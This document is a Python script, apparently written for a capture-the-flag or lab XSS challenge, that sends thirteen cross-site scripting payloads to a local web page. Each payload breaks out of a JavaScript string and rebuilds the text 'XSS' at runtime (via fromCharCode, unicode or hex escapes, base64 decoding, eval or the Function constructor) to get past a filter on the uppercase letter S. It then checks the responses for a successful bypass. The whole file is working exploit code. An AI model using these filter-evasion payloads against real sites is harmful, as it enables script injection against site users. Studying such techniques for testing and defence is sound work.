import requests
import urllib.parse
import base64

# Target URL
target_url = "http://127.0.0.1:32830/page"

# Payload generation functions
def url_encode(s):
    return urllib.parse.quote(s, safe='')

def double_url_encode(s):
    return urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')

def create_payloads():
    """Generate various XSS payloads that construct 'XSS' dynamically"""
    payloads = []
    
    # Base breakout string to escape the JavaScript context
    breakout = '";'
    comment = '//'
    
    # Payload 1: String.fromCharCode - no uppercase S in transmission
    payload1 = breakout + "alert(String.fromCharCode(88,83,83))" + comment
    payloads.append(("String.fromCharCode(88,83,83)", payload1))
    
    # Payload 2: String.fromCharCode with eval wrapper
    payload2 = breakout + "eval(String.fromCharCode(97,108,101,114,116,40,88,83,83,41))" + comment
    payloads.append(("eval(String.fromCharCode)", payload2))
    
    # Payload 3: Character array join (avoids uppercase letters)
    payload3 = breakout + "alert(['X','S','S'].join(''))" + comment
    payloads.append(("Array.join('X','S','S')", payload3))
    
    # Payload 4: Unicode escape sequences (no uppercase S in transmission)
    payload4 = breakout + "alert('\\u0058\\u0053\\u0053')" + comment
    payloads.append(("Unicode escapes \\u0058\\u0053\\u0053", payload4))
    
    # Payload 5: String concatenation with fromCharCode
    payload5 = breakout + "a=String.fromCharCode(88,83,83),alert(a)" + comment
    payloads.append(("Variable assignment + alert", payload5))
    
    # Payload 6: Base64 decode to construct XSS
    b64_xss = base64.b64encode(b"XSS").decode()
    payload6 = breakout + "alert(atob('" + b64_xss + "'))" + comment
    payloads.append(("atob base64 decode", payload6))
    
    # Payload 7: eval with concatenated strings
    payload7 = breakout + "eval('ale'+'rt(\\'XSS\\')')" + comment
    payloads.append(("eval with string concat", payload7))
    
    # Payload 8: window['alert'] syntax
    payload8 = breakout + "this['alert'](String.fromCharCode(88,83,83))" + comment
    payloads.append(("this['alert'] + fromCharCode", payload8))
    
    # Payload 9: using Function constructor
    payload9 = breakout + "Function('alert(\"XSS\")')()" + comment
    payloads.append(("Function constructor", payload9))
    
    # Payload 10: Hex encoding
    payload10 = breakout + "alert('\\x58\\x53\\x53')" + comment
    payloads.append(("Hex encoding \\x58\\x53\\x53", payload10))
    
    # Payload 11: Multiple concatenation methods combined
    payload11 = breakout + "x='X',y='S',z='S',alert(x+y+z)" + comment
    payloads.append(("Multi-variable concat", payload11))
    
    # Payload 12: location.hash approach
    payload12 = breakout + "location.hash='#'+String.fromCharCode(88,83,83),alert(location.hash.substring(1))" + comment
    payloads.append(("location.hash construction", payload12))
    
    # Payload 13: String constructor
    payload13 = breakout + "alert(String(88,83,83))" + comment
    payloads.append(("String constructor", payload13))
    
    return payloads

# Generate all payloads
all_payloads = create_payloads()

print(f"[*] Testing {len(all_payloads)} XSS payloads against uppercase 'S' filter")
print(f"[*] Target: {target_url}?name=PAYLOAD\n")
print("="*80)

# Test each payload
for i, (desc, payload) in enumerate(all_payloads, 1):
    print(f"\n[TEST {i:02d}] {desc}")
    print(f"Original: {payload}")
    
    # URL encode the payload
    encoded_payload = url_encode(payload)
    print(f"URL-encoded: {encoded_payload}")
    
    # Test the payload
    try:
        url = f"{target_url}?name={encoded_payload}"
        response = requests.get(url, timeout=10)
        
        # Check if payload executed (look for evidence in response)
        response_text = response.text
        
        print(f"Status: {response.status_code}")
        print(f"Response length: {len(response_text)} bytes")
        
        # Look for signs of successful XSS
        if "XSS" in response_text:
            print(f"[+] SUCCESS: 'XSS' string appeared in response!")
            # Check if it's in an alert or similar context
            if "alert" in response_text and ("88,83,83" in response_text or "\\u0058" in response_text):
                print(f"[!] POTENTIAL BYPASS: Filter bypassed, dynamic construction executed!")
        else:
            print(f"[-] No 'XSS' in response (filter may be blocking)")
            
        # Check what the reflection looks like
        if 'var name = ' in response_text:
            # Extract the var assignment line
            lines = response_text.split('\n')
            for line in lines:
                if 'var name =' in line:
                    print(f"Reflection: {line.strip()}")
                    break
        
        # Print a snippet of the response around the reflection
        if payload.replace('";', '') in response_text:
            idx = response_text.find(payload.replace('";', ''))
            if idx > -1:
                snippet = response_text[max(0, idx-50):min(len(response_text), idx+150)]
                print(f"Snippet: ...{snippet}...")
        
    except Exception as e:
        print(f"[-] Error: {str(e)}")
    
    print("-"*80)

# Summary of best payloads to try
print("\n" + "="*80)
print("SUMMARY: Most Promising Payloads for Uppercase 'S' Bypass")
print("="*80)
print("\nTop candidates (construct 'XSS' without writing uppercase 'S'):")
print("1. String.fromCharCode(88,83,83) - Uses numbers, no letters")
print("2. '\\u0058\\u0053\\u0053' - Unicode escapes in transmission")
print("3. ['X','S','S'].join('') - Split across array elements")
print("4. atob('WFNT') - Base64 decode (if supported)")
print("\nThese payloads avoid transmitting uppercase 'S' while constructing it at runtime.")
